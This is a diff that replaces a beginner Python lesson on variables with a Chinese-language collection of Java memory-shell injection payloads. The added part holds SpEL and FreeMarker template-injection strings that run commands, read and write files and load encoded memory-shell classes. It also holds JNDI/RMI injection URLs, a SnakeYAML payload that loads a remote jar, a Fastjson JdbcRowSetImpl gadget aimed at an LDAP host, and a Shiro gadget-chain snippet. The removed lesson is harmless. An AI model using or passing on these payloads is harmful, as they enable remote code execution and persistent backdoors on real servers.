@@ -1,255 +1,113 @@
+# Memoryshell-JavaALL
+收集内存马打入方式
 
-# Naming things with Variables
+## SPEL 
 
-### Introduction
+不加模板解析的payload
+```
+T(java.lang.Runtime).getRuntime().exec("calc")
+new+java.lang.ProcessBuilder("cmd","/c","Calc").start()
+```
+加模板解析的payload
+```
+#{new java.lang.ProcessBuilder({'calc'}).start()}
+```
+可以回显时使用
+```
+new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
+```
+可以打入内存马高版本Spring Core 受限
+```
+#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
+```
+使用JNDI 注入利用 在Springboot 中不适用，因为它会程序启动时初始化InitialContext
+```
+#{T(java.lang.System).setProperty('com.sun.jndi.ldap.object.trustURLCodebase', 'true')} 
+#{new javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"), new java.util.Hashtable()).connect()}
+```
+## FreeMarker 
 
-> "There are only two hard things in Computer Science: cache invalidation and naming things."
+执行命令
+```
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.Execute"?new()("Calc")}
+<#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}
+```
+写文件
+```
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/tmp/hh.txt").append("<>").close()}
+```
+读文件
+```
+<#assign+value="freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","C:\\Temp\\test.txt")>${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner",value).useDelimiter("\\Aasd").next()}
+```
+使用SPEL利用
+```
+${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(java.lang.Runtime).getRuntime().exec(\"calc\")").getValue()}
+```
+使用SPEL 进行JNDI
+```
+${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("new+javax.management.remote.rmi.RMIConnector(new+javax.management.remote.JMXServiceURL(\"service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc\"),new+java.util.Hashtable()).connect()").getValue()}
+```
+使用SPEL 加载内存马
+```
+${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.springframework.cglib.core.ReflectUtils).defineClass('SpringInterceptor',T(org.springframework.util.Base64Utils).decodeFromString(\"yv66vgAAADQA5。。。\"),new+javax.management.loading.MLet(new+java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()").getValue()}
+```
+使用Jython 
+```
+<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
+```
+## YAML
 
-> -- Phil Karlton
-
-> "...But ordinary language is all right."
-
-> Ludwig Wittgenstein
-
-### Objectives
-
-* Learn about how to use variables to give meaning to data
-* Learn how to assign a variable to data
-* Learn how to declare a variable
-* Learn how to reassign a variable
-
-### Declaring and Assigning Variables
-
-So far we have worked with data -- strings, numbers, and booleans.  In this lesson, we'll learn how to use variables to assign names to this data.  For example, this is a string from our Working with **Data Types Lab**.
-
-
-```python
-"art vandelay"
+ftp 可以换为HTTP 及其他支持协议
+```
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["ftp://127.0.0.1:8000/yaml-payload4.jar"]]]]
 ```
 
+不出网时： 
 
+感觉搭配C3P0 得方式还是没有这种带来的安全感足
 
+ScriptEngineManager(目前比较通用的一种方式，思路也比较好。同时拓展一下如果可以通过反序列化落地，那如果拥有上传接口也可以通过上传落地再进行加载。)
 
-    'art vandelay'
+第一步：通过反序列化实现文件落地
 
+第二步：加载本地文件内容
 
-
-Now months later, if we see that string in some code, we may be confused as to what it is, and with even more data, this only becomes more difficult. Think of what we saw in our **Data Types Lab**: `"art.vandelay@vandelay.co"`, `"Ceo"`, `"7285553334"`, `"vandelay.com"`. There's a lot to keep track of.
-
-So, let's use variables to indicate what each of these strings mean.
-
-
-```python
-email = "art.vandelay@vandelay.co"
+```
+复现链接：https://xz.aliyun.com/t/10655
 ```
 
-> **Note:** For this, and all of the subsequent code in gray boxes, you should press shift + enter to ensure that the code executes. If you do not do so with the line above for example, then when we reference `email` in the lines that follow, Jupyter will throw an error indicating that the variable is undefined. So, it is not enough to just type the correct code, we need to run shift + enter on our gray boxes to run this code.
+## Fastjson
 
-In programming terms, we say that we just declared a variable, `email`, and assigned it to the string, `"art.vandelay@vandelay.co"`.  To do so, we'll follow the procedure below:
-
-    variable = data
-
-Now that we have assigned a variable `email` to a string, we just type the word `email` to see the string again.
-
-
-```python
-email
+```
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://xx.xx.xx.xx:9102/123",
+        "autoCommit":true
+    }
+}
 ```
 
-> *remember to press shift + enter on the gray box above to see the value of our variable, *`email`*.*
-
-Now let's try this with the website:
-
-
-```python
-website = "vandelay.com"
-website
+## Shiro Cookie 过长？ 不防看看这种方法
+熟悉得师傅一下就可以看出内存马怎们打了吧
 ```
-
-Note that if you introduce a new variable, (declare it), but do not also assign it in the same line, Python will raise an error.
-
-
-```python
-name
+    final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+    queue.add("1");
+    queue.add("1");
+    Reflections.setFieldValue(comparator, "property", "parameterMetaData");
+    JdbcRowSetImpl test =  new com.sun.rowset.JdbcRowSetImpl();
+    test.setDataSourceName("ldap://823s64b3.dns.1433.eu.org.");
+    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+    queueArray[0] = test;
+    return queue;
 ```
-
-
-    ----------------------------------------------------------
-
-    NameError                Traceback (most recent call last)
-
-    <ipython-input-6-9bc0cb2ed6de> in <module>()
-    ----> 1 name
-
-
-    NameError: name 'name' is not defined
-
-
-So that error tells us that `name` is not defined.  We just fix this by declaring `name` and assigning the variable in the same line.
-
-
-```python
-name = 'Art Vandelay'
-name
-```
-
-So this is assigning and reading a variable.  And when we want to see some information again, we can easily find out.
-
-
-```python
-email
-```
-
-### Declaring variables without assignment
-
-We have seen that we can have data without assigning it to variables.  
-
-
-```python
-"Unassigned data"
-```
-
-
-
-
-    'Unassigned data'
-
-
-
-Sometimes we wish to declare a variable without assigning it to data.  In Python, that's a little tricky to do.  As we just saw with `name`, declaring variables without assignment throws an error.  Thankfully, Python has a special type for us that represents nothing at all.
-
-
-```python
-None
-```
-
-
-```python
-type(None)
-```
-
-
-
-
-    NoneType
-
-
-
-None is a data type in Python that represents nothing.  So, if we do not know the type of a variable and want to have the data to the variable be assigned later, we can assign that variable to `None`.
-
-
-```python
-address = None
-```
-
-Notice that `address` is now assigned, but it is assigned to `None`.
-
-
-```python
-address
-```
-
-**Note:** *when variables are assigned to `None`, pressing shift + enter on the cell block will not output anything.*
-
-### Reassigning variables
-
-Now that we have this data, we can imagine using it for some kind of instruction.  For example, say we want to write ourself a memo on how to reach out to someone we just met. Here's the message:
-
-
-```python
-"Send an email to Art Vandelay at 'art.vandelay@vandelay.com' to say how nice it was meeting yesterday."
-```
-
-If we construct this message with variables, we can write the following:
-
-
-```python
-name = "Art Vandelay"
-email = "art.vandelay@vandelay.com"
-```
-
-
-```python
-"Send an email to " + name + " at " + email +  " to say how nice it was meeting yesterday."
-```
-
-Now you meet someone else, "Liz Kaplan" with the email of "liz@ka-plan.com" and want to write a memo with the same instructions, but the only thing that varies are the name and email. This should be easy enough given the way we set up our memo above. First we need to change the variables, `name` and `email`, by setting them to our new data.
-
-
-```python
-name = 'Liz Kaplan'
-email = 'liz@ka-plan.com'
-```
-
-So as you can see, we reassign our variables by just setting `variable = 'new data'`. Presto, our variable is then updated.
-
-
-```python
-name # 'Liz Kaplan'
-```
-
-
-```python
-email # 'liz@ka-plan.com'
-```
-
-Now, if we copy and re-run our previous code, we will see it is automatically updated.
-
-
-```python
-"Send an email to " + name + " at " + email +  " to say how nice it was meeting yesterday."
-```
-
-So in the line above, we are getting to some of the real power of programming.  By choosing the correct variable name, we can begin to change the values of `name` or `email` and operate on their underlying values in the same ways.
-
-### Operating on variables
-
-Just to hammer this point home let's see what we can now do with the name variable.
-
-
-```python
-name
-```
-
-
-```python
-name.upper()
-```
-
-
-```python
-name.title()
-```
-
-Just like how we are able to directly call methods on a string, we can also call methods on a variable that points to a string.  And, if we try to call a method on something that we think is a string, but really is a number, we will see an error.
-
-
-```python
-name = 42
-```
-
-
-```python
-name.upper()
-```
-
-We receive the same error from calling `upper` directly on the number `42` as we do when we call `upper` on a variable that points to the number `42`. So, now that we are working with variables, we may run into errors where we thought a variable is one thing, but it is actually something else. Don't worry, this is no big deal.  We can just check to see what the variable is.
-
-
-```python
-name
-```
-
-Once we have see what the variable is, we can make our change.
-
-
-```python
-name = 'Liz Kaplan'
-name
-```
-
-### Summary
-
-In this lesson, we got a taste for what makes computer programs so powerful.  By using variables, we can write programs that know how to combine data.  This can save us time by avoiding boring, repetitive tasks.  We declare and assign a variable with the pattern of `variable = data`, and reassign a variable with the same pattern.  To reference a variable, we simply type the variable's name.  
-
-We also saw that one of the things to pay attention to when working with variables is that they are sometimes different from what we expect.  So we just type the name of the variable, to see what it really is and make any necessary changes.
+------------------------------------------------------------------------------------
+各位师傅有建议及其他Payload 带带弟弟啊
+未完待续.....
